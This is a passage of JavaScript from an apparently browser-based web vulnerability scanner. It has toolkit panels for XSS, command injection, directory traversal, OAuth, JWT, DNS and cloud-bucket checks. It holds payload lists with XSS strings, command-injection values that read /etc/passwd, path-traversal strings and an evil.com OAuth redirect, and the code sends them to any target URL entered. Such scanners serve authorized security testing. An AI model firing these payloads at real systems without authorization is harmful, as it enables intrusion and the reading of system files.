  const XSS_PAYLOADS = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>', '"><script>alert(1)</script>', "'-alert(1)-'", 'javascript:alert(1)', '<iframe src="javascript:alert(1)">'];

  function xssPanelHTML() {
    return buildPanel("xss", `
      <div class="advanced-scan-field glass-input"><label>Target URL (with parameter)</label><input type="url" id="tkXssUrl" placeholder="https://target.com/search?q=test" /></div>
      <button id="tkXssBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-code"></i><span>Test XSS</span></button>
      <div id="tkXssResults" style="margin-top:12px;"></div>
    `);
  }

  async function xssTest() {
    const url = $("tkXssUrl")?.value.trim();
    const out = $("tkXssResults");
    if (!url) { toast("Enter a target URL with parameter", "warn"); return; }
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Testing ${XSS_PAYLOADS.length} XSS payloads...</div>`;

    const findings = [];
    for (const payload of XSS_PAYLOADS) {
      try {
        const testUrl = new URL(url);
        testUrl.searchParams.forEach((v, k) => { testUrl.searchParams.set(k, payload); });
        const res = await fetchT(testUrl.href);
        const body = await res.text();
        if (body.includes(payload)) findings.push({ payload, status: res.status });
      } catch {}
    }

    out.innerHTML = findings.length ?
      `<div class="recon-list-item">${badge(`${findings.length} reflected XSS indicator(s)!`, "bad")}${findings.map(f => `<div>${badge(f.payload, "warn")} → ${badge(`HTTP ${f.status}`, "info")} ${badge("reflected!", "bad")}</div>`).join("")}</div>` :
      `<div class="recon-list-item">${badge("No reflected XSS detected", "good")}</div>`;
    toast(findings.length ? "Possible XSS!" : "No XSS detected", findings.length ? "warn" : "success");
  }

  /* ============ 13. COMMAND INJECTION ============ */
  const CMDI_PAYLOADS = ["; ls", "| ls", "|| ls", "&& ls", "`ls`", "$(ls)", "; cat /etc/passwd", "| cat /etc/passwd"];
  const CMDI_OUTPUTS = [/root:/i, /bin\/bash/i, /bin\/sh/i, /\[boot\]/i, /nobody:/i];

  function cmdiPanelHTML() {
    return buildPanel("cmdi", `
      <div class="advanced-scan-field glass-input"><label>Target URL (with parameter)</label><input type="url" id="tkCmdiUrl" placeholder="https://target.com/ping?host=127.0.0.1" /></div>
      <button id="tkCmdiBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-terminal"></i><span>Test Command Injection</span></button>
      <div id="tkCmdiResults" style="margin-top:12px;"></div>
    `);
  }

  async function cmdiTest() {
    const url = $("tkCmdiUrl")?.value.trim();
    const out = $("tkCmdiResults");
    if (!url) { toast("Enter a target URL with parameter", "warn"); return; }
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Testing ${CMDI_PAYLOADS.length} command injection payloads...</div>`;

    const findings = [];
    for (const payload of CMDI_PAYLOADS) {
      try {
        const testUrl = new URL(url);
        testUrl.searchParams.forEach((v, k) => { testUrl.searchParams.set(k, v + payload); });
        const res = await fetchT(testUrl.href);
        const body = await res.text();
        if (CMDI_OUTPUTS.some(re => re.test(body))) findings.push({ payload, status: res.status });
      } catch {}
    }

    out.innerHTML = findings.length ?
      `<div class="recon-list-item">${badge(`${findings.length} command injection indicator(s)!`, "bad")}${findings.map(f => `<div>${badge(f.payload, "warn")} → ${badge(`HTTP ${f.status}`, "info")}</div>`).join("")}</div>` :
      `<div class="recon-list-item">${badge("No command injection detected", "good")}</div>`;
    toast(findings.length ? "Possible command injection!" : "No CMDi detected", findings.length ? "warn" : "success");
  }

  /* ============ 14. DIRECTORY TRAVERSAL ============ */
  const TRAVERSAL_PAYLOADS = ["../../../etc/passwd", "..%2f..%2f..%2fetc/passwd", "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "..\\..\\..\\etc\\passwd", "..%252f..%252f..%252fetc/passwd"];

  function traversalPanelHTML() {
    return buildPanel("traversal", `
      <div class="advanced-scan-field glass-input"><label>Target URL (with file parameter)</label><input type="url" id="tkTraversalUrl" placeholder="https://target.com/view?file=index.html" /></div>
      <button id="tkTraversalBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-folder-tree"></i><span>Test Directory Traversal</span></button>
      <div id="tkTraversalResults" style="margin-top:12px;"></div>
    `);
  }

  async function traversalTest() {
    const url = $("tkTraversalUrl")?.value.trim();
    const out = $("tkTraversalResults");
    if (!url) { toast("Enter a target URL with file parameter", "warn"); return; }
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Testing ${TRAVERSAL_PAYLOADS.length} traversal payloads...</div>`;

    const findings = [];
    for (const payload of TRAVERSAL_PAYLOADS) {
      try {
        const testUrl = new URL(url);
        testUrl.searchParams.forEach((v, k) => { testUrl.searchParams.set(k, payload); });
        const res = await fetchT(testUrl.href);
        const body = await res.text();
        if (body.includes("root:") || body.includes("/bin/bash") || body.includes("[boot]")) findings.push({ payload, status: res.status });
      } catch {}
    }

    out.innerHTML = findings.length ?
      `<div class="recon-list-item">${badge(`${findings.length} directory traversal indicator(s)!`, "bad")}${findings.map(f => `<div>${badge(f.payload, "warn")} → ${badge(`HTTP ${f.status}`, "info")}</div>`).join("")}</div>` :
      `<div class="recon-list-item">${badge("No directory traversal detected", "good")}</div>`;
    toast(findings.length ? "Possible directory traversal!" : "No traversal detected", findings.length ? "warn" : "success");
  }

  /* ============ 15. WEBSOCKET TESTING ============ */
  function wsPanelHTML() {
    return buildPanel("websocket", `
      <div class="advanced-scan-field glass-input"><label>WebSocket URL</label><input type="text" id="tkWsUrl" placeholder="wss://target.com/ws" /></div>
      <div class="advanced-scan-field glass-input"><label>Message to send</label><input type="text" id="tkWsMsg" placeholder='{"type":"ping"}' /></div>
      <button id="tkWsBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-plug"></i><span>Test WebSocket</span></button>
      <div id="tkWsResults" style="margin-top:12px;"></div>
    `);
  }

  async function wsTest() {
    const url = $("tkWsUrl")?.value.trim();
    const msg = $("tkWsMsg")?.value.trim() || '{"type":"ping"}';
    const out = $("tkWsResults");
    if (!url) { toast("Enter a WebSocket URL", "warn"); return; }
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Connecting to WebSocket...</div>`;

    try {
      const ws = new WebSocket(url);
      const timeout = setTimeout(() => { ws.close(); out.innerHTML = `<div class="recon-list-item">${badge("Connection timeout", "warn")}</div>`; }, 5000);

      ws.onopen = () => {
        ws.send(msg);
        out.innerHTML = `<div class="recon-list-item">${badge("Connected", "good")} ${badge("Message sent", "info")}</div>`;
      };
      ws.onmessage = (e) => {
        clearTimeout(timeout);
        out.innerHTML = `<div class="recon-list-item">${badge("Connected", "good")}<div><strong>Response:</strong> ${code(String(e.data).slice(0, 1000))}</div></div>`;
        ws.close();
      };
      ws.onerror = () => {
        clearTimeout(timeout);
        out.innerHTML = `<div class="recon-list-item">${badge("Connection error", "bad")}</div>`;
      };
    } catch (e) {
      out.innerHTML = `<div class="recon-list-item">${badge("error", "bad")} ${esc(e.message)}</div>`;
    }
  }

  /* ============ 16. API VERSIONING DISCOVERY ============ */
  function apiVersionPanelHTML() {
    return buildPanel("apiversion", `
      <div class="advanced-scan-field glass-input"><label>Base API URL</label><input type="url" id="tkApiUrl" placeholder="https://target.com/api" /></div>
      <button id="tkApiBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-code-branch"></i><span>Discover API Versions</span></button>
      <div id="tkApiResults" style="margin-top:12px;"></div>
    `);
  }

  async function apiVersionTest() {
    const url = $("tkApiUrl")?.value.trim();
    const out = $("tkApiResults");
    if (!url) { toast("Enter a base API URL", "warn"); return; }
    const base = new URL(url).origin;
    const paths = ["/api", "/api/v1", "/api/v2", "/api/v3", "/v1", "/v2", "/v3", "/graphql", "/api-docs", "/swagger.json", "/openapi.json"];
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Checking ${paths.length} API paths...</div>`;

    const found = [];
    for (const path of paths) {
      try {
        const res = await fetchT(base + path, { method: "HEAD" });
        if (res.status !== 404) found.push({ path, status: res.status });
      } catch {}
    }

    out.innerHTML = found.length ?
      `<div class="recon-list-item">${badge(`${found.length} API versions found`, "warn")}${found.map(f => `<div>${badge(f.status, f.status < 400 ? "good" : "warn")} ${code(f.path)}</div>`).join("")}</div>` :
      `<div class="recon-list-item">${badge("No API versions detected", "good")}</div>`;
    toast(`Found ${found.length} API versions`, found.length ? "success" : "info");
  }

  /* ============ 17. JWT ANALYSIS ENHANCEMENTS ============ */
  function jwtEnhancedPanelHTML() {
    return buildPanel("jwtenhanced", `
      <div class="advanced-scan-field glass-input"><label>JWT Token</label><textarea id="tkJwtEnhInput" rows="3" placeholder="eyJhbGciOiJIUzI1NiIs..."></textarea></div>
      <div class="advanced-scan-field glass-input"><label>Target URL (for JWKS discovery)</label><input type="url" id="tkJwtEnhUrl" placeholder="https://target.com" /></div>
      <button id="tkJwtEnhBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-key"></i><span>Analyze JWT</span></button>
      <div id="tkJwtEnhResults" style="margin-top:12px;"></div>
    `);
  }

  async function jwtEnhancedTest() {
    const token = $("tkJwtEnhInput")?.value.trim();
    const url = $("tkJwtEnhUrl")?.value.trim();
    const out = $("tkJwtEnhResults");
    if (!token) { toast("Enter a JWT token", "warn"); return; }

    try {
      const parts = token.split(".");
      const header = JSON.parse(atob(parts[0].replace(/-/g, "+").replace(/_/g, "/")));
      const payload = JSON.parse(atob(parts[1].replace(/-/g, "+").replace(/_/g, "/")));

      const findings = [];
      if (header.alg === "none") findings.push(badge("alg:none - Token can be forged!", "bad"));
      if (header.alg === "HS256" && !payload.iss) findings.push(badge("HS256 without issuer - May be vulnerable to key confusion", "warn"));
      if (!payload.exp) findings.push(badge("No expiration claim", "warn"));
      else if (payload.exp * 1000 < Date.now()) findings.push(badge("Token is expired", "good"));
      else if (payload.exp * 1000 > Date.now() + 86400000 * 365) findings.push(badge("Token has excessive lifetime", "warn"));

      // JWKS discovery
      let jwksFound = false;
      if (url) {
        const origin = new URL(url).origin;
        const jwksPaths = ["/.well-known/jwks.json", "/jwks.json", "/.well-known/openid-configuration"];
        for (const path of jwksPaths) {
          try {
            const res = await fetchT(origin + path);
            if (res.ok) { jwksFound = true; findings.push(badge(`JWKS endpoint found: ${path}`, "info")); break; }
          } catch {}
        }
      }

      out.innerHTML = `
        <div class="recon-list-item">
          <div><strong>Header:</strong> ${code(JSON.stringify(header))}</div>
          <div><strong>Payload:</strong> ${code(JSON.stringify(payload))}</div>
          <div style="margin-top:8px;">${findings.join(" ")}</div>
          ${!jwksFound && url ? badge("No JWKS endpoint found", "info") : ""}
        </div>`;
      toast("JWT analysis complete", "success");
    } catch (e) {
      out.innerHTML = `<div class="recon-list-item">${badge("Invalid JWT", "bad")} ${esc(e.message)}</div>`;
    }
  }

  /* ============ 18. OAUTH SECURITY TESTING ============ */
  function oauthTestPanelHTML() {
    return buildPanel("oauthtest", `
      <div class="advanced-scan-field glass-input"><label>Authorization URL</label><input type="url" id="tkOauthUrl" placeholder="https://provider.com/authorize" /></div>
      <div class="advanced-scan-field glass-input"><label>Client ID</label><input type="text" id="tkOauthClientId" placeholder="client-id" /></div>
      <div class="advanced-scan-field glass-input"><label>Redirect URI</label><input type="url" id="tkOauthRedirect" placeholder="https://app.com/callback" /></div>
      <button id="tkOauthTestBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-shield-halved"></i><span>Test OAuth Security</span></button>
      <div id="tkOauthTestResults" style="margin-top:12px;"></div>
    `);
  }

  async function oauthTestRun() {
    const authUrl = $("tkOauthUrl")?.value.trim();
    const clientId = $("tkOauthClientId")?.value.trim();
    const redirect = $("tkOauthRedirect")?.value.trim();
    const out = $("tkOauthTestResults");
    if (!authUrl || !clientId || !redirect) { toast("Fill in all fields", "warn"); return; }

    const tests = [
      { desc: "Missing state parameter", url: `${authUrl}?response_type=code&client_id=${clientId}&redirect_uri=${redirect}` },
      { desc: "Open redirect URI", url: `${authUrl}?response_type=code&client_id=${clientId}&redirect_uri=https://evil.com&state=test` },
      { desc: "No PKCE (plain)", url: `${authUrl}?response_type=code&client_id=${clientId}&redirect_uri=${redirect}&state=test` }
    ];

    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Running ${tests.length} OAuth tests...</div>`;
    const results = tests.map(t => ({ ...t, note: "Requires manual verification" }));

    out.innerHTML = `<div class="recon-list-item">${results.map(r => `<div>${badge(r.desc, "warn")} ${code(r.url.slice(0, 80))}... <span class="field-status">${r.note}</span></div>`).join("")}</div>`;
    toast("OAuth tests ready - verify manually", "info");
  }

  /* ============ 19. DNS SECURITY ANALYSIS ============ */
  function dnsSecurityPanelHTML() {
    return buildPanel("dnssecurity", `
      <div class="advanced-scan-field glass-input"><label>Domain</label><input type="text" id="tkDnsDomain" placeholder="example.com" /></div>
      <button id="tkDnsSecBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-shield-halved"></i><span>Analyze DNS Security</span></button>
      <div id="tkDnsSecResults" style="margin-top:12px;"></div>
    `);
  }

  async function dnsSecurityTest() {
    const domain = $("tkDnsDomain")?.value.trim();
    const out = $("tkDnsSecResults");
    if (!domain) { toast("Enter a domain", "warn"); return; }
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Analyzing DNS security...</div>`;

    const results = {};
    const types = ["A", "AAAA", "CNAME", "MX", "NS", "TXT", "SOA"];
    for (const type of types) {
      try {
        const res = await fetch(`https://dns.google/resolve?name=${domain}&type=${type}`);
        const data = await res.json();
        if (data.Answer) results[type] = data.Answer.map(a => ({ data: a.data, ttl: a.TTL }));
      } catch {}
    }

    const nsRecords = (results.NS || []).map(r => r.data.replace(/\.$/, ""));
    const mxRecords = (results.MX || []).map(r => r.data);
    const txtRecords = (results.TXT || []).map(r => r.data);
    const hasSPF = txtRecords.some(r => r.includes("v=spf1"));
    const hasDMARC = txtRecords.some(r => r.includes("v=DMARC1"));

    out.innerHTML = `
      <div class="recon-list-item">
        <div><strong>NS Records:</strong> ${nsRecords.length ? nsRecords.map(r => code(r)).join(", ") : badge("none", "warn")}</div>
        <div><strong>MX Records:</strong> ${mxRecords.length ? mxRecords.map(r => code(r)).join(", ") : badge("none", "warn")}</div>
        <div><strong>SPF:</strong> ${hasSPF ? badge("present", "good") : badge("missing", "bad")}</div>
        <div><strong>DMARC:</strong> ${hasDMARC ? badge("present", "good") : badge("missing", "bad")}</div>
        <div><strong>TXT Records:</strong> ${txtRecords.length ? txtRecords.map(r => code(r)).join("<br/>") : badge("none", "info")}</div>
      </div>`;
    toast("DNS security analysis complete", "success");
  }

  /* ============ 20. EMAIL SECURITY ============ */
  function emailSecPanelHTML() {
    return buildPanel("emailsec", `
      <div class="advanced-scan-field glass-input"><label>Domain</label><input type="text" id="tkEmailDomain" placeholder="example.com" /></div>
      <button id="tkEmailSecBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-envelope-shield"></i><span>Check Email Security</span></button>
      <div id="tkEmailSecResults" style="margin-top:12px;"></div>
    `);
  }

  async function emailSecTest() {
    const domain = $("tkEmailDomain")?.value.trim();
    const out = $("tkEmailSecResults");
    if (!domain) { toast("Enter a domain", "warn"); return; }
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Checking email security records...</div>`;

    const results = {};
    for (const type of ["MX", "TXT"]) {
      try {
        const res = await fetch(`https://dns.google/resolve?name=${domain}&type=${type}`);
        const data = await res.json();
        if (data.Answer) results[type] = data.Answer.map(a => a.data);
      } catch {}
    }

    const txtRecords = results.TXT || [];
    const spf = txtRecords.find(r => r.includes("v=spf1"));
    const dmarc = txtRecords.find(r => r.includes("v=DMARC1"));
    const dkim = txtRecords.find(r => r.includes("v=DKIM1"));

    out.innerHTML = `
      <div class="recon-list-item">
        <div><strong>MX:</strong> ${(results.MX || []).map(r => code(r)).join(", ") || badge("none", "warn")}</div>
        <div><strong>SPF:</strong> ${spf ? badge("present", "good") + " " + code(spf) : badge("MISSING - Email spoofing possible!", "bad")}</div>
        <div><strong>DMARC:</strong> ${dmarc ? badge("present", "good") + " " + code(dmarc) : badge("MISSING", "bad")}</div>
        <div><strong>DKIM:</strong> ${dkim ? badge("present", "good") + " " + code(dkim) : badge("not found (check selector._domainkey)", "warn")}</div>
      </div>`;
    toast("Email security check complete", "success");
  }

  /* ============ 21. CLOUD STORAGE ENUMERATION ============ */
  function cloudStoragePanelHTML() {
    return buildPanel("cloudstorage", `
      <div class="advanced-scan-field glass-input"><label>Bucket/Container Name</label><input type="text" id="tkCloudName" placeholder="my-bucket" /></div>
      <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px;">
        <button id="tkCloudS3Btn" class="btn btn-primary"><i class="fab fa-aws"></i><span>S3 Buckets</span></button>
        <button id="tkCloudGcsBtn" class="btn btn-secondary"><i class="fab fa-google"></i><span>GCS Buckets</span></button>
        <button id="tkCloudAzureBtn" class="btn btn-secondary"><i class="fab fa-microsoft"></i><span>Azure Blobs</span></button>
        <button id="tkCloudDoBtn" class="btn btn-secondary"><i class="fab fa-digital-ocean"></i><span>DO Spaces</span></button>
      </div>
      <div id="tkCloudResults" style="margin-top:12px;"></div>
    `);
  }

  async function cloudStorageTest(provider) {
    const name = $("tkCloudName")?.value.trim();
    const out = $("tkCloudResults");
    if (!name) { toast("Enter a bucket name", "warn"); return; }
    const suffixes = ["", "-dev", "-staging", "-prod", "-backup", "-test", "-data", "-logs", "-assets", "-media"];
    const urls = suffixes.map(s => {
      if (provider === "s3") return `https://${name}${s}.s3.amazonaws.com/`;
      if (provider === "gcs") return `https://storage.googleapis.com/${name}${s}/`;
      if (provider === "azure") return `https://${name}${s}.blob.core.windows.net/?comp=list`;
      return `https://${name}${s}.digitaloceanspaces.com/`;
    });

    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Enumerating ${provider.toUpperCase()} buckets...</div>`;
    const results = await window.mapWithConcurrency(urls, concurrency(), async (url) => {
      try { const res = await fetchT(url); return { url, status: res.status }; } catch { return { url, error: true }; }
    });

    const accessible = results.filter(r => r.status === 200);
    const exists = results.filter(r => r.status === 403);
    out.innerHTML = `
      <div class="recon-list-item">
        ${accessible.length ? badge(`${accessible.length} ACCESSIBLE buckets!`, "bad") : ""}
        ${exists.length ? badge(`${exists.length} existing (403)`, "warn") : ""}
        ${results.map(r => `<div>${r.error ? badge("?", "info") : badge(r.status, r.status === 200 ? "bad" : r.status === 403 ? "warn" : "info")} ${code(r.url)}</div>`).join("")}
      </div>`;
    toast(`Found ${accessible.length} accessible buckets`, accessible.length ? "warn" : "success");
  }

  /* ============ 22. CONTAINER/DOCKER EXPOSURE ============ */
  function containerPanelHTML() {
    return buildPanel("container", `
      <div class="advanced-scan-field glass-input"><label>Target URL</label><input type="url" id="tkContainerUrl" placeholder="https://target.com" /></div>
      <button id="tkContainerBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fab fa-docker"></i><span>Check Container Exposure</span></button>
      <div id="tkContainerResults" style="margin-top:12px;"></div>
    `);
  }

  async function containerTest() {
    const url = $("tkContainerUrl")?.value.trim();
    const out = $("tkContainerResults");
    if (!url) { toast("Enter a target URL", "warn"); return; }
    const base = new URL(url).origin;
    const paths = ["/docker.sock", "/var/run/docker.sock", "/_apis", "/api/v1/namespaces", "/healthz", "/metrics", "/api", "/version", "/containers/json"];
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Checking container exposure...</div>`;

    const found = [];
    for (const path of paths) {
      try {
        const res = await fetchT(base + path, { method: "HEAD" });
        if (res.status === 200) found.push({ path, status: res.status });
      } catch {}
    }

    out.innerHTML = found.length ?
      `<div class="recon-list-item">${badge(`${found.length} exposure(s) found!`, "bad")}${found.map(f => `<div>${badge(f.status, "bad")} ${code(f.path)}</div>`).join("")}</div>` :
      `<div class="recon-list-item">${badge("No container exposure detected", "good")}</div>`;
    toast(found.length ? "Container exposure found!" : "No exposure", found.length ? "warn" : "success");
  }

  /* ============ 23. CI/CD PIPELINE EXPOSURE ============ */
  function cicdPanelHTML() {
    return buildPanel("cicd", `
      <div class="advanced-scan-field glass-input"><label>Target URL</label><input type="url" id="tkCicdUrl" placeholder="https://target.com" /></div>
      <button id="tkCicdBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fab fa-jenkins"></i><span>Check CI/CD Exposure</span></button>
      <div id="tkCicdResults" style="margin-top:12px;"></div>
    `);
  }

  async function cicdTest() {
    const url = $("tkCicdUrl")?.value.trim();
    const out = $("tkCicdResults");
    if (!url) { toast("Enter a target URL", "warn"); return; }
    const base = new URL(url).origin;
    const paths = [
      "/jenkins/", "/job/", "/blue/", "/gitlab/", "/.gitlab-ci.yml",
      "/.github/workflows/", "/.travis.yml", "/.circleci/config.yml",
      "/appveyor.yml", "/Jenkinsfile", "/bitbucket-pipelines.yml",
      "/.drone.yml", "/azure-pipelines.yml", "/cloudbuild.yaml",
      "/wercker.yml", "/.argo/", "/argo/", "/concourse/", "/ci/"
    ];
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Checking ${paths.length} CI/CD paths...</div>`;

    const found = [];
    for (const path of paths) {
      try {
        const res = await fetchT(base + path, { method: "HEAD" });
        if (res.status === 200) found.push({ path, status: res.status });
      } catch {}
    }

    out.innerHTML = found.length ?
      `<div class="recon-list-item">${badge(`${found.length} CI/CD exposure(s)!`, "bad")}${found.map(f => `<div>${badge(f.status, "bad")} ${code(f.path)}</div>`).join("")}</div>` :
      `<div class="recon-list-item">${badge("No CI/CD exposure detected", "good")}</div>`;
    toast(found.length ? "CI/CD exposure found!" : "No exposure", found.length ? "warn" : "success");
  }

  /* ============ 24. MOBILE APP ANALYSIS ============ */
  function mobilePanelHTML() {
    return buildPanel("mobile", `
      <div class="advanced-scan-field glass-input"><label>Target URL</label><input type="url" id="tkMobileUrl" placeholder="https://target.com" /></div>
      <button id="tkMobileBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-mobile-screen"></i><span>Analyze Mobile Endpoints</span></button>
      <div id="tkMobileResults" style="margin-top:12px;"></div>
    `);
  }

  async function mobileTest() {
    const url = $("tkMobileUrl")?.value.trim();
    const out = $("tkMobileResults");
    if (!url) { toast("Enter a target URL", "warn"); return; }
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Analyzing mobile endpoints...</div>`;

    try {
      const res = await fetchT(url);
      const body = await res.text();
      const findings = [];

      // Deep links
      const deepLinks = body.match(/(?:myapp|appname|targetapp):\/\/[^\s"<>]+/gi) || [];
      if (deepLinks.length) findings.push({ type: "Deep Links", items: [...new Set(deepLinks)] });

      // App store links
      const appStore = body.match(/https:\/\/apps\.apple\.com\/[^\s"<>]+/gi) || [];
      const playStore = body.match(/https:\/\/play\.google\.com\/store\/apps\/[^\s"<>]+/gi) || [];
      if (appStore.length || playStore.length) findings.push({ type: "App Store Links", items: [...appStore, ...playStore] });

      // Manifest
      const manifest = body.match(/href=["'][^"']*manifest\.json[^"']*/gi) || [];
      if (manifest.length) findings.push({ type: "Web App Manifest", items: manifest });

      // Service Worker
      const sw = body.match(/navigator\.serviceWorker\.register\([^)]+\)/gi) || [];
      if (sw.length) findings.push({ type: "Service Worker", items: sw });

      out.innerHTML = findings.length ?
        `<div class="recon-list-item">${findings.map(f => `<div><strong>${f.type}:</strong> ${f.items.map(i => code(i.slice(0, 100))).join("<br/>")}</div>`).join("")}</div>` :
        `<div class="recon-list-item">${badge("No mobile-specific endpoints found", "good")}</div>`;
      toast("Mobile analysis complete", "success");
    } catch (e) {
      out.innerHTML = `<div class="recon-list-item">${badge("error", "bad")} ${esc(e.message)}</div>`;
    }
  }

  /* ============ 25. REAL-TIME COLLABORATION ============ */
  function collabPanelHTML() {
    return buildPanel("collab", `
      <div class="advanced-scan-field glass-input"><label>Share Scan Session</label>
        <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px;">
          <button id="tkCollabExportBtn" class="btn btn-primary"><i class="fas fa-share"></i><span>Export as JSON</span></button>
          <button id="tkCollabImportBtn" class="btn btn-secondary"><i class="fas fa-file-import"></i><span>Import Session</span></button>
          <input id="tkCollabImportFile" type="file" accept=".json" hidden />
        </div>
      </div>
      <div class="advanced-scan-field glass-input"><label>Findings Notes</label>
        <textarea id="tkCollabNotes" rows="4" placeholder="Add notes about findings here..."></textarea>
        <button id="tkCollabSaveBtn" class="btn btn-secondary" style="margin-top:8px;"><i class="fas fa-save"></i><span>Save Notes</span></button>
      </div>
      <div id="tkCollabResults" style="margin-top:12px;"></div>
    `);
  }

  function collabExport() {
    const st = window.state;
    if (!st) { toast("No scan data to export", "warn"); return; }
    const session = {
      version: "3.0",
      exportedAt: new Date().toISOString(),
      findings: window.getVisibleFindings ? window.getVisibleFindings() : [],
      notes: $("tkCollabNotes")?.value || "",
      stats: { endpoints: st.endpoints?.size || 0, secrets: st.secrets?.size || 0, files: st.files?.size || 0 }
    };
    download("web-x-sider-collab.json", JSON.stringify(session, null, 2), "application/json");
    toast("Session exported for collaboration", "success");
  }

  function collabImport() {
    $("tkCollabImportFile")?.click();
  }

  /* ============ INIT ============ */
  function addTabs() {
    const tabs = document.getElementById("toolkit-tabs");
    if (!tabs || tabs.dataset.tk3done) return;
    tabs.dataset.tk3done = "1";

    const newTabs = [
      ["waf", "fas fa-shield-halved", "WAF Detect"],
      ["subdomain", "fas fa-network-wired", "Subdomains"],
      ["redirect", "fas fa-arrow-right-arrow-left", "Open Redirect"],
      ["ratelimit", "fas fa-gauge-high", "Rate Limit"],
      ["port", "fas fa-plug", "Port Scan"],
      ["backup", "fas fa-file-zipper", "Backup Finder"],
      ["methods", "fas fa-route", "HTTP Methods"],
      ["clickjack", "fas fa-window-maximize", "Clickjacking"],
      ["headers", "fas fa-list-check", "Header Analysis"],
      ["cachepoison", "fas fa-flask", "Cache Poison"],
      ["sqli", "fas fa-database", "SQLi"],
      ["xss", "fas fa-code", "XSS"],
      ["cmdi", "fas fa-terminal", "CMDi"],
      ["traversal", "fas fa-folder-tree", "Traversal"],
      ["websocket", "fas fa-plug", "WebSocket"],
      ["apiversion", "fas fa-code-branch", "API Versions"],
      ["jwtenhanced", "fas fa-key", "JWT Enhanced"],
      ["oauthtest", "fas fa-shield-halved", "OAuth Test"],
      ["dnssecurity", "fas fa-server", "DNS Security"],
      ["emailsec", "fas fa-envelope-shield", "Email Security"],
      ["cloudstorage", "fas fa-cloud", "Cloud Storage"],
      ["container", "fas fa-docker", "Containers"],
      ["cicd", "fas fa-jenkins", "CI/CD"],
      ["mobile", "fas fa-mobile-screen", "Mobile App"],
      ["collab", "fas fa-users", "Collaborate"]
    ];

    newTabs.forEach(([id, icon, label]) => {
      const btn = document.createElement("button");
      btn.className = "tab-btn";
      btn.dataset.tkTab = id;
      btn.innerHTML = `<i class="${icon}"></i><span>${label}</span>`;
      btn.addEventListener("click", () => {
        document.querySelectorAll("#toolkit-tabs .tab-btn").forEach(b => b.classList.remove("active"));
        btn.classList.add("active");
        document.querySelectorAll(".tk-panel").forEach(p => { p.style.display = "none"; });
        const panel = document.getElementById(`tk-panel-${id}`);
        if (panel) panel.style.display = "block";
      });
      tabs.appendChild(btn);
    });

    const section = tabs.parentElement;
    const panelsHtml = [
      wafPanelHTML(), subdomainPanelHTML(), redirectPanelHTML(), rateLimitPanelHTML(),
      portPanelHTML(), backupPanelHTML(), methodPanelHTML(), clickjackPanelHTML(),
      headerPanelHTML(), cachePanelHTML(), sqliPanelHTML(), xssPanelHTML(),
      cmdiPanelHTML(), traversalPanelHTML(), wsPanelHTML(), apiVersionPanelHTML(),
      jwtEnhancedPanelHTML(), oauthTestPanelHTML(), dnsSecurityPanelHTML(), emailSecPanelHTML(),
      cloudStoragePanelHTML(), containerPanelHTML(), cicdPanelHTML(), mobilePanelHTML(), collabPanelHTML()
    ].join("\n");
    const tmp = document.createElement("div");
    tmp.innerHTML = panelsHtml;
    while (tmp.firstChild) section.appendChild(tmp.firstChild);
  }

  document.addEventListener("DOMContentLoaded", () => {
    addTabs();

    $("tkWafBtn")?.addEventListener("click", wafDetect);
    $("tkSubBruteBtn")?.addEventListener("click", subdomainBrute);
    $("tkSubCtBtn")?.addEventListener("click", subdomainCT);
    $("tkSubDnsBtn")?.addEventListener("click", subdomainDns);
    $("tkRedirectBtn")?.addEventListener("click", redirectTest);
    $("tkRateBtn")?.addEventListener("click", rateLimitTest);
    $("tkPortBtn")?.addEventListener("click", portScan);
    $("tkBackupBtn")?.addEventListener("click", backupFind);
    $("tkMethodBtn")?.addEventListener("click", methodTest);
    $("tkClickjackBtn")?.addEventListener("click", clickjackTest);
    $("tkHeaderBtn")?.addEventListener("click", headerAnalyze);
    $("tkCachePoisonBtn")?.addEventListener("click", cachePoisonTest);
    $("tkSqliBtn")?.addEventListener("click", sqliTest);
    $("tkXssBtn")?.addEventListener("click", xssTest);
    $("tkCmdiBtn")?.addEventListener("click", cmdiTest);
    $("tkTraversalBtn")?.addEventListener("click", traversalTest);
    $("tkWsBtn")?.addEventListener("click", wsTest);
    $("tkApiBtn")?.addEventListener("click", apiVersionTest);
    $("tkJwtEnhBtn")?.addEventListener("click", jwtEnhancedTest);
    $("tkOauthTestBtn")?.addEventListener("click", oauthTestRun);
    $("tkDnsSecBtn")?.addEventListener("click", dnsSecurityTest);
    $("tkEmailSecBtn")?.addEventListener("click", emailSecTest);
    $("tkCloudS3Btn")?.addEventListener("click", () => cloudStorageTest("s3"));
    $("tkCloudGcsBtn")?.addEventListener("click", () => cloudStorageTest("gcs"));
    $("tkCloudAzureBtn")?.addEventListener("click", () => cloudStorageTest("azure"));
    $("tkCloudDoBtn")?.addEventListener("click", () => cloudStorageTest("do"));
